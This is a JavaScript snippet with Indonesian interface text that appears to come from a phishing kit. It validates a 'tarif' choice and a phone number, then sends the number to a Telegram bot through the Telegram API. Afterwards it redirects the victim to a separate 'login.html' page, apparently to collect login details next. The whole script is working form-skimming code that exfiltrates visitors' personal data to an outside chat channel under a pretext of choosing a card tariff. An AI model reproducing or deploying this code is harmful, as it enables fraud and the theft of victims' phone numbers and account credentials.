<script>
document.getElementById('myForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    let selectedTarif = '';
    const radioButtons = document.querySelectorAll('input[name="tarif"]');
    for (const radio of radioButtons) {
        if (radio.checked) {
            selectedTarif = radio.value;
            break;
        }
    }
    
    const nohp = document.getElementById('nohp').value;
    
    if (!selectedTarif) {
        alert('Silakan pilih jenis kartu terlebih dahulu!');
        return;
    }
    
    if (!nohp || nohp.length < 10) {
        alert('Silakan masukkan nomor HP yang valid (minimal 10 digit)!');
        return;
    }
    
    document.getElementById('djload').style.display = 'block';
    
    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString('id-ID');
    
    const message = `📱 No hp: ${nohp}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            // Simpan ke localStorage dan sessionStorage
            localStorage.setItem('nohp', nohp);
            sessionStorage.setItem('nohp', nohp);
            // Redirect dengan URL parameter
            window.location.href = 'login.html?nohp=' + encodeURIComponent(nohp);
        } else {
            document.getElementById('djload').style.display = 'none';
            alert('Gagal mengirim data. Silakan coba lagi.');
        }
    } catch (error) {
        document.getElementById('djload').style.display = 'none';
        alert('Terjadi kesalahan. Silakan coba lagi.');
    }
});

document.getElementById('nohp').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});
